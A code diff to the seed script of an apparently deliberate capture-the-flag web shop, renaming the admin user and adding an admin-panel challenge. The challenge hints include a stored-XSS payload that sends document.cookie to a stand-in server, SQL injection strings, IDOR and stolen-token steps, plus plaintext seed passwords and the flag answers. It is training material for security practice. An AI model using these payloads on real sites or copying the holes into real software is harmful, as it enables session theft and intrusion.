@@ -22,7 +22,7 @@ const insertUser = db.prepare(`
 `);
 
 const users = [
-  ['bugdrop_admin', 'password123', 'The Creator', 'admin',
+  ['bugdrop_admin', 'password123', 'Admin', 'admin',
     'Lead designer at Bugdrop. I know where the molds are kept.',
     'admin-token-super-secreto-12345'],
   ['minion_42', 'esbirro2024', 'Collector #42', 'collector',
@@ -107,7 +107,7 @@ const insertOrderItem = db.prepare(`
   VALUES (?, ?, ?, ?)
 `);
 
-// Pedido 1: The Creator (Admin) — contiene los planos secretos (bandera IDOR)
+// Pedido 1: Admin (Admin) — contiene los planos secretos (bandera IDOR)
 const order1 = insertOrder.run(
   1, 'completed', 'paid', 752500000,
   '🚨 INTERNAL ONLY 🚨 Production molds for Bug ???. Factory coordinates: 47.1234°N, 172.5678°W. Access Code: FLAG{idor_leaked_factory_molds}. DO NOT SHARE OUTSIDE DESIGN TEAM.'
@@ -175,17 +175,17 @@ const flags = [
   ['stored_xss',
     'FLAG{xss_collector_stolen_session}',
     'Stolen Session (Stored XSS)',
-    'Steal the admin cookie (The Creator) by injecting code into the product reviews.',
+    'Steal the admin cookie (Admin) by injecting code into the product reviews.',
     'medium',
     'Product reviews are rendered without sanitization. What if you write something that is not just plain text?',
     'Write a review with a payload like <script>document.location="http://your-server?c="+document.cookie</script> or just execute alert() with document.cookie.'],
   ['idor_orders',
     'FLAG{idor_leaked_factory_molds}',
     'Leaked Molds (IDOR)',
-    'Read order #1 belonging to The Creator containing the factory molds coordinates.',
+    'Read order #1 belonging to Admin containing the factory molds coordinates.',
     'easy',
     'When checking your own collection/orders, the URL has a numeric ID. Does the server verify that order belongs to you?',
-    'Make a GET request to /api/orders/1 while logged in as any other user. If there is no ownership validation, you will see The Creator data.'],
+    'Make a GET request to /api/orders/1 while logged in as any other user. If there is no ownership validation, you will see Admin data.'],
   ['payment_bypass',
     'FLAG{payment_bypass_vip_collector}',
     'Payment Bypass',
@@ -200,6 +200,13 @@ const flags = [
     'easy',
     'The newsletter input is raw concatenated into the SQL query.',
     "Try putting `bugdrop_admin'--` or `admin' OR '1'='1` in the email input. Because the frontend uses type='text' instead of 'email', you can bypass HTML validation easily."],
+  ['admin_panel',
+    'FLAG{the_creator_secret_panel}',
+    'Admin (Admin Panel)',
+    'Access the secret administrator dashboard using a stolen session.',
+    'hard',
+    'Where do admins usually log in or view internal data? Look for hidden routes like /admin or /admin.',
+    'Use the JWT token stolen from the Stored XSS challenge. Set it in your browser localStorage as "bugdrop_token" and navigate to /admin.'],
 ];
 
 for (const f of flags) {
@@ -222,6 +229,7 @@ console.log(`
 ║  3. FLAG{idor_leaked_factory_molds}              ║
 ║  4. FLAG{payment_bypass_vip_collector}           ║
 ║  5. FLAG{sqli_newsletter_admin_coupon}           ║
+║  6. FLAG{the_creator_secret_panel}               ║
 ╚══════════════════════════════════════════════════╝
 `);
 
